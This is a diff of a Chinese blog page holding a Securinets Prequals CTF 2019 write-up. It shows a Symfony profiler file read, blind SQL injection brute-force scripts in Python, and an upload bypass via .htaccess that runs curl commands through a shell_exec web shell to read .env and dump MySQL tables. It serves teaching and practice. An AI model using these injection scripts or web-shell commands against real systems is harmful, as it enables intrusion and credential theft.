@@ -1,24 +1,122 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="microworld,bubbl3@foxmail.com"><title>Securinets Prequals CTF 2019 · damn1t</title><meta name="description" content="Securinets Prequals CTF 2019custom location在url后追加/robots.txt，报错，出现调试页面，仔细观察url，尝试读取文件
-https://web0.ctfsecurinets.com/_profiler/open?file=public/index"><meta name="keywords" content="security,pentest,personal"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">damn1t</a></h3><div class="description"><p>及时行乐.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Securinets Prequals CTF 2019</a></h3></div><div class="post-content"><h1 id="Securinets-Prequals-CTF-2019"><a href="#Securinets-Prequals-CTF-2019" class="headerlink" title="Securinets Prequals CTF 2019"></a>Securinets Prequals CTF 2019</h1><h2 id="custom-location"><a href="#custom-location" class="headerlink" title="custom location"></a>custom location</h2><p>在url后追加<code>/robots.txt</code>，报错，出现调试页面，仔细观察url，尝试读取文件</p>
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Securinets Prequals CTF 2019 · Mr.Long's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">longlongyu</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Long's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">Securinets Prequals CTF 2019</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-03-30</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="CTF"> CTF</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="Securinets-Prequals-CTF-2019"><a href="#Securinets-Prequals-CTF-2019" class="headerlink" title="Securinets Prequals CTF 2019"></a>Securinets Prequals CTF 2019</h1><h2 id="custom-location"><a href="#custom-location" class="headerlink" title="custom location"></a>custom location</h2><p>在url后追加<code>/robots.txt</code>，报错，出现调试页面，仔细观察url，尝试读取文件</p>
 <pre><code>https://web0.ctfsecurinets.com/_profiler/open?file=public/index.php
 </code></pre><p>跟入index.php，发现一行<code>require dirname(__DIR__).&#39;/config/bootstrap.php&#39;;</code><br>于是改payload为<code>file=/config/bootstrap.php</code>，看到：</p>
 <pre><code>&lt;?php
 use Symfony\Component\Dotenv\Dotenv;
-require dirname(__DIR__).&apos;/vendor/autoload.php&apos;;
+require dirname(__DIR__).&#39;/vendor/autoload.php&#39;;
 // Load cached env vars if the .env.local.php file exists
 // Run &quot;composer dump-env prod&quot; to create it (requires symfony/flex &gt;=1.2)
-if (is_array($env = @include dirname(__DIR__).&apos;/.env.local.php&apos;)) {
+if (is_array($env = @include dirname(__DIR__).&#39;/.env.local.php&#39;)) {
 $_SERVER += $env;
 $_ENV += $env;
 } elseif (!class_exists(Dotenv::class)) {
-throw new RuntimeException(&apos;Please run &quot;composer require symfony/dotenv&quot; to load the &quot;.env&quot; files configuring the application.&apos;);
+throw new RuntimeException(&#39;Please run &quot;composer require symfony/dotenv&quot; to load the &quot;.env&quot; files configuring the application.&#39;);
 } else {
 // load all the .env files
-(new Dotenv())-&gt;loadEnv(dirname(__DIR__).&apos;/secret_ctf_location/env&apos;);
+(new Dotenv())-&gt;loadEnv(dirname(__DIR__).&#39;/secret_ctf_location/env&#39;);
 }
-$_SERVER[&apos;APP_ENV&apos;] = $_ENV[&apos;APP_ENV&apos;] = ($_SERVER[&apos;APP_ENV&apos;] ?? $_ENV[&apos;APP_ENV&apos;] ?? null) ?: &apos;dev&apos;;
-$_SERVER[&apos;APP_DEBUG&apos;] = $_SERVER[&apos;APP_DEBUG&apos;] ?? $_ENV[&apos;APP_DEBUG&apos;] ?? &apos;prod&apos; !== $_SERVER[&apos;APP_ENV&apos;];
-$_SERVER[&apos;APP_DEBUG&apos;] = $_ENV[&apos;APP_DEBUG&apos;] = (int) $_SERVER[&apos;APP_DEBUG&apos;] || filter_var($_SERVER[&apos;APP_DEBUG&apos;], FILTER_VALIDATE_BOOLEAN) ? &apos;1&apos; : &apos;0&apos;;
+$_SERVER[&#39;APP_ENV&#39;] = $_ENV[&#39;APP_ENV&#39;] = ($_SERVER[&#39;APP_ENV&#39;] ?? $_ENV[&#39;APP_ENV&#39;] ?? null) ?: &#39;dev&#39;;
+$_SERVER[&#39;APP_DEBUG&#39;] = $_SERVER[&#39;APP_DEBUG&#39;] ?? $_ENV[&#39;APP_DEBUG&#39;] ?? &#39;prod&#39; !== $_SERVER[&#39;APP_ENV&#39;];
+$_SERVER[&#39;APP_DEBUG&#39;] = $_ENV[&#39;APP_DEBUG&#39;] = (int) $_SERVER[&#39;APP_DEBUG&#39;] || filter_var($_SERVER[&#39;APP_DEBUG&#39;], FILTER_VALIDATE_BOOLEAN) ? &#39;1&#39; : &#39;0&#39;;
 </code></pre><p>看到了<code>/secret_ctf_location/env</code>，查看该文件，得到flag</p>
 <pre><code># In all environments, the following files are loaded if they exist,
 # the later taking precedence over the former:
@@ -38,7 +136,7 @@ $_SERVER[&apos;APP_DEBUG&apos;] = $_ENV[&apos;APP_DEBUG&apos;] = (int) $_SERVER[
 APP_ENV=dev
 APP_SECRET=44705a2f4fc85d70df5403ac8c7649fd
 #TRUSTED_PROXIES=127.0.0.1,127.0.0.2
-#TRUSTED_HOSTS=&apos;^localhost|example\.com$&apos;
+#TRUSTED_HOSTS=&#39;^localhost|example\.com$&#39;
 ###&lt; symfony/framework-bundle ###
 ###&gt; doctrine/doctrine-bundle ###
 # Format described at http://docs.doctrine-project.org/projects/doctrine-dbal/en/latest/reference/configuration.html#connecting-using-a-url
@@ -55,19 +153,19 @@ MAILER_URL=null://localhost
 </code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>改url为<code>https://web0.ctfsecurinets.com/_profiler</code>，出现一个控制面板<br><img src="https://i.imgur.com/VPA7F39.png" alt="1"></p>
 <p>点击token，进入控制面板，然后查看路由，尝试_profile/phpinfo,但是没什么东西，于是返回控制面版的<code>request/response</code>，点击<code>Server Parameters</code>，在<code>DATABASE_URL</code>字段看到<code>&quot;mysql://symfony_admin:Securinets{D4taB4se_P4sSw0Rd_My5qL_St0L3n}@127.0.0.1:3306/symfony_task&quot;</code></p>
 <h2 id="sql-injected"><a href="#sql-injected" class="headerlink" title="sql injected"></a>sql injected</h2><p>题目给出了源码，查看index.php</p>
-<pre><code>if (isset($_POST[&apos;post_author&apos;])) {
-$sql = &quot;SELECT * FROM posts WHERE author = &apos;&quot;. mysqli_real_escape_string($conn, $_POST[&apos;post_author&apos;]) .&quot;&apos;&quot;;
+<pre><code>if (isset($_POST[&#39;post_author&#39;])) {
+$sql = &quot;SELECT * FROM posts WHERE author = &#39;&quot;. mysqli_real_escape_string($conn, $_POST[&#39;post_author&#39;]) .&quot;&#39;&quot;;
 try {
 $posts = $conn-&gt;query($sql);
 } catch(Exception $err) {
-echo &apos;err: &apos;.$err;
+echo &#39;err: &#39;.$err;
 }
 } else {
-$sql = &quot;SELECT * FROM posts WHERE author = &apos;&quot;. $_SESSION[&apos;username&apos;] .&quot;&apos;&quot;;
+$sql = &quot;SELECT * FROM posts WHERE author = &#39;&quot;. $_SESSION[&#39;username&#39;] .&quot;&#39;&quot;;
 try {
 $posts = $conn-&gt;query($sql);
 } catch(Exception $err) {
-echo &apos;err: &apos;.$err;
+echo &#39;err: &#39;.$err;
 }
 }
 </code></pre><p>这是查询的方式，<code>&quot;SELECT * FROM posts WHERE author = &#39;&quot;. $_SESSION[&#39;username&#39;] .&quot;&#39;&quot;;</code>，无过滤，为漏洞点<br>又查看create_db.sql，字段如下：</p>
@@ -75,16 +173,16 @@ echo &apos;err: &apos;.$err;
 create table users (id int auto_increment primary key, login varchar(100), password varchar(100), role boolean default 0);
 create table posts (id int auto_increment primary key, title varchar(50), content text, date Date, author varchar(100));
 </code></pre><p>flag的条件为<br>flags.php:<code>$_SESSION[&#39;role&#39;] === &#39;1&#39;</code><br>在login.php中：</p>
-<pre><code>if (isset($_POST[&apos;username&apos;]) &amp;&amp; !empty($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]) &amp;&amp; !empty($_POST[&apos;password&apos;])) {
-$username = mysqli_real_escape_string($conn, $_POST[&apos;username&apos;]);
-$password = mysqli_real_escape_string($conn, $_POST[&apos;password&apos;]);
-$sql = &quot;SELECT * FROM users WHERE login=&apos;&quot;. $username .&quot;&apos; and password=&apos;&quot;. $password .&quot;&apos;&quot;;
+<pre><code>if (isset($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) {
+$username = mysqli_real_escape_string($conn, $_POST[&#39;username&#39;]);
+$password = mysqli_real_escape_string($conn, $_POST[&#39;password&#39;]);
+$sql = &quot;SELECT * FROM users WHERE login=&#39;&quot;. $username .&quot;&#39; and password=&#39;&quot;. $password .&quot;&#39;&quot;;
 $res = $conn-&gt;query($sql);
 if($res-&gt;num_rows &gt; 0) {
 $user = $res-&gt;fetch_assoc();
-$_SESSION[&apos;username&apos;] = $user[&apos;login&apos;];
-$_SESSION[&apos;role&apos;] = $user[&apos;role&apos;];
-header(&apos;location: index.php&apos;);
+$_SESSION[&#39;username&#39;] = $user[&#39;login&#39;];
+$_SESSION[&#39;role&#39;] = $user[&#39;role&#39;];
+header(&#39;location: index.php&#39;);
 die();
 } else {
 $success = false;
@@ -97,11 +195,11 @@ $success = false;
         //generate random token
     }
 
-if (!isset($_SESSION[&apos;count&apos;]))
+if (!isset($_SESSION[&#39;count&#39;]))
     {
-    $_SESSION[&apos;count&apos;] = 0;
+    $_SESSION[&#39;count&#39;] = 0;
     $pass = generateRandomToken(100);
-    $ip = $_SERVER[&apos;REMOTE_ADDR&apos;];
+    $ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
     $sql = &quot;INSERT INTO users (ip, token) VALUES (?,?)&quot;;
     $stmt = $pdo-&gt;prepare($sql);
     $stmt-&gt;execute([$ip, $pass]);
@@ -110,28 +208,28 @@ if (!isset($_SESSION[&apos;count&apos;]))
 <pre><code>&lt;?php
 $max_count = 10;
 
-if (!isset($_SESSION[&apos;count&apos;]))
+if (!isset($_SESSION[&#39;count&#39;]))
     {
-    echo &quot;&lt;h1&gt;Session Expired ! Please click &lt;a href=&apos;start.php&apos;&gt;&lt;/h1&gt; here&lt;/a&gt; &quot;;
+    echo &quot;&lt;h1&gt;Session Expired ! Please click &lt;a href=&#39;start.php&#39;&gt;&lt;/h1&gt; here&lt;/a&gt; &quot;;
     die();
     }
 
 require_once (&quot;task_bd.php&quot;);
 
-$currentValue = &apos;&apos;;
+$currentValue = &#39;&#39;;
 
 if (isset($_POST[&quot;val&quot;]))
     {
-    if ($_SESSION[&apos;count&apos;] &gt;= $max_count)
+    if ($_SESSION[&#39;count&#39;] &gt;= $max_count)
         {
         header(&quot;Location:reset.php&quot;);
         die();
         }
 
-    $_SESSION[&apos;count&apos;]++;
+    $_SESSION[&#39;count&#39;]++;
     try
         {
-        $sql = &quot;SELECT * FROM users WHERE ip=&apos;&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;] . &quot;&apos; AND token=&apos;&quot; . $_POST[&apos;val&apos;] . &quot;&apos;&quot;;
+        $sql = &quot;SELECT * FROM users WHERE ip=&#39;&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;] . &quot;&#39; AND token=&#39;&quot; . $_POST[&#39;val&#39;] . &quot;&#39;&quot;;
         $result = $conn-&gt;query($sql);
         if ($result)
             {
@@ -153,35 +251,35 @@ if (isset($_POST[&quot;val&quot;]))
     if ($row)
         {
         echo &quot;&lt;h1&gt;True&lt;/h1&gt;&quot;;
-        echo &quot;&lt;div&gt;&lt;h4&gt;Click &lt;a href=&apos;flag.php&apos;&gt;here&lt;/a&gt; and use the token to get your flag&lt;/h4&gt;&lt;/div&gt;&quot;;
+        echo &quot;&lt;div&gt;&lt;h4&gt;Click &lt;a href=&#39;flag.php&#39;&gt;here&lt;/a&gt; and use the token to get your flag&lt;/h4&gt;&lt;/div&gt;&quot;;
         }
       else
         {
         echo &quot;&lt;h4&gt;Better luck next time !&lt;/h4&gt;&quot;;
         }
 
-    $currentValue = $_POST[&apos;val&apos;];
+    $currentValue = $_POST[&#39;val&#39;];
     }
 
-echo &quot;&lt;h3&gt;Attempt: &quot; . ($_SESSION[&apos;count&apos;]) . &quot; / &quot; . $max_count . &quot;&lt;/h2&gt;&lt;br /&gt;&quot;;
+echo &quot;&lt;h3&gt;Attempt: &quot; . ($_SESSION[&#39;count&#39;]) . &quot; / &quot; . $max_count . &quot;&lt;/h2&gt;&lt;br /&gt;&quot;;
 ?&gt;
 </code></pre><p>查询对应的token和ip，可知，那就要写script爆破了<br>脚本1：</p>
 <pre><code>import requests
 
 url = &quot;https://web4.ctfsecurinets.com/play.php&quot;
 
-injection = &quot;&apos; OR (ip=&apos;teammate IP&apos; AND substring(token,%s,1)=&apos;%s&apos;) AND &apos;1&apos;=&apos;1&quot;
-token = &apos;&apos;
+injection = &quot;&#39; OR (ip=&#39;teammate IP&#39; AND substring(token,%s,1)=&#39;%s&#39;) AND &#39;1&#39;=&#39;1&quot;
+token = &#39;&#39;
 
 for i in range(1, 101):
-  for b in &apos;abcdefghijklmnopqrstuvwxyz0123456789&apos;:
+  for b in &#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;:
 # Resetting the session and requesting a new one, just in case.
 # The exploit would have been faster by removing this.
-requests.get(url.replace(&apos;play&apos;, &apos;reset&apos;))
+requests.get(url.replace(&#39;play&#39;, &#39;reset&#39;))
 s = requests.session()
-s.get(url.replace(&apos;play&apos;, &apos;index&apos;))
-c = s.post(url, data={&apos;val&apos;: injection % (i, b)}).content
-if b&apos;&gt;True&lt;&apos; in c:
+s.get(url.replace(&#39;play&#39;, &#39;index&#39;))
+c = s.post(url, data={&#39;val&#39;: injection % (i, b)}).content
+if b&#39;&gt;True&lt;&#39; in c:
   token += b
   print(i, token)
   break
@@ -196,7 +294,7 @@ token = &quot;&quot;
 found = len(token)
 letters = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
 letter_candidate = 0
-payload = &quot;val=&apos; OR (ip=&apos;x.x.x.x&apos; AND token LIKE &apos;{}%&apos;) #&quot;
+payload = &quot;val=&#39; OR (ip=&#39;x.x.x.x&#39; AND token LIKE &#39;{}%&#39;) #&quot;
 headers = {
    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);&quot;, 
    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;
@@ -216,7 +314,7 @@ def debug(page, local_debug):
 
 try:
 
-   print &quot;[*] Contacting &apos;{}&apos;.&quot;.format(url_reset)
+   print &quot;[*] Contacting &#39;{}&#39;.&quot;.format(url_reset)
    page = requests.get(url_reset, headers=headers)
    cookies = {&quot;PHPSESSID&quot;: page.cookies[&quot;PHPSESSID&quot;]}
    debug(page, False)
@@ -224,18 +322,18 @@ try:
 
    while found &lt; 100:
 
-  print &quot;[*] Contacting &apos;{}&apos;.&quot;.format(url_index)
+  print &quot;[*] Contacting &#39;{}&#39;.&quot;.format(url_index)
   page = requests.get(url_index, headers=headers, cookies=cookies)
   debug(page, False)
 
   if &quot;Session Expired&quot; in page.text:
- print &quot;[*] Session expired, contacting &apos;{}&apos;.&quot;.format(url_index)
+ print &quot;[*] Session expired, contacting &#39;{}&#39;.&quot;.format(url_index)
  page = requests.get(url_index, headers=headers, cookies=cookies)
  debug(page, False)
   elif &quot;Attempt&quot; in page.text:
  letter = letters[letter_candidate]
  attempt = token + letter
- print &quot;[*] Attempt &apos;{}&apos;.&quot;.format(attempt)
+ print &quot;[*] Attempt &#39;{}&#39;.&quot;.format(attempt)
  data = payload.format(attempt)
  print &quot;[*] Payload: {}.&quot;.format(data)
  page = requests.post(url_play, data=data, headers=headers, cookies=cookies)
@@ -245,12 +343,12 @@ try:
 token += letter
 found += 1
 letter_candidate = 0
-print &quot;[*] Correct letter, new token &apos;{}&apos;.&quot;.format(token)
+print &quot;[*] Correct letter, new token &#39;{}&#39;.&quot;.format(token)
  elif &quot;Better luck next time&quot; in page.text:
 letter_candidate = letter_candidate + 1
 print &quot;[*] Wrong letter.&quot; 
  elif &quot;Max Attempts Reahed&quot; in page.text:
-print &quot;[*] Max attempts reached, contacting &apos;{}&apos;.&quot;.format(url_index)
+print &quot;[*] Max attempts reached, contacting &#39;{}&#39;.&quot;.format(url_index)
 page = requests.get(url_index, headers=headers, cookies=cookies)
 debug(page, False)
  else:
@@ -267,10 +365,10 @@ except KeyboardInterrupt:
 </code></pre><h2 id="Trading-values"><a href="#Trading-values" class="headerlink" title="Trading values"></a>Trading values</h2><p>查看网页源码：</p>
 <pre><code>&lt;script&gt;
 
-Highcharts.chart(&apos;container&apos;, {
+Highcharts.chart(&#39;container&#39;, {
 chart: {
-type: &apos;spline&apos;,
-animation: Highcharts.svg, // don&apos;t animate in old IE
+type: &#39;spline&#39;,
+animation: Highcharts.svg, // don&#39;t animate in old IE
 marginRight: 10,
 events: {
 load: function () {
@@ -299,25 +397,25 @@ useUTC: false
 },
 
 title: {
-text: &apos;Live Securinets Trading values&apos;
+text: &#39;Live Securinets Trading values&#39;
 },
 xAxis: {
-type: &apos;datetime&apos;,
+type: &#39;datetime&#39;,
 tickPixelInterval: 300
 },
 yAxis: {
 title: {
-text: &apos;Value&apos;
+text: &#39;Value&#39;
 },
 plotLines: [{
 value: 0,
 width: 1,
-color: &apos;#808080&apos;
+color: &#39;#808080&#39;
 }]
 },
 tooltip: {
-headerFormat: &apos;&lt;b&gt;{series.name}&lt;/b&gt;&lt;br/&gt;&apos;,
-pointFormat: &apos;{point.x:%Y-%m-%d %H:%M:%S}&lt;br/&gt;{point.y:.2f}&apos;
+headerFormat: &#39;&lt;b&gt;{series.name}&lt;/b&gt;&lt;br/&gt;&#39;,
+pointFormat: &#39;{point.x:%Y-%m-%d %H:%M:%S}&lt;br/&gt;{point.y:.2f}&#39;
 },
 legend: {
 enabled: false
@@ -326,7 +424,7 @@ exporting: {
 enabled: false
 },
 series: [{
-name: &apos;Random data&apos;,
+name: &#39;Random data&#39;,
 data: (function () {
 // generate an array of random data
 var data = [],
@@ -401,12 +499,12 @@ AddHandler application/x-httpd-php5 .png
 
 #curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=cat ../../../.env&quot;
 
-#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database symfony_task_3 -e &apos;show tables&apos;&quot;
+#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database symfony_task_3 -e &#39;show tables&#39;&quot;
 
-#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost -e &apos;show databases&apos;&quot;
+#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost -e &#39;show databases&#39;&quot;
 
-#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database big_database -e &apos;show tables&apos;&quot;
+#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database big_database -e &#39;show tables&#39;&quot;
 
-#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e64d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database big_database -e &apos;select * from user_details&apos; | grep Securinets&quot;
+#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e64d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database big_database -e &#39;select * from user_details&#39; | grep Securinets&quot;
 </code></pre><p> reference：<a href="https://github.com/mohamedaymenkarmous/CTF/tree/master/CTFSecurinetsQuals2019#unbreakable-uploader" target="_blank" rel="noopener">https://github.com/mohamedaymenkarmous/CTF/tree/master/CTFSecurinetsQuals2019#unbreakable-uploader</a></p>
-</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-03-30</span><i class="fa fa-tag"></i><a class="tag" href="/tags/CTF/" title="CTF">CTF </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://microvorld.com/2019/03/30/CTF/Securinets Prequals CTF 2019/,damn1t,Securinets Prequals CTF 2019,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2019/04/01/CTF/fireshell ctf(vice)/" title="fireshell ctf2019 vice">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2019/03/29/OS/command/" title="常用指令及其含义(linux 和 windows)">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
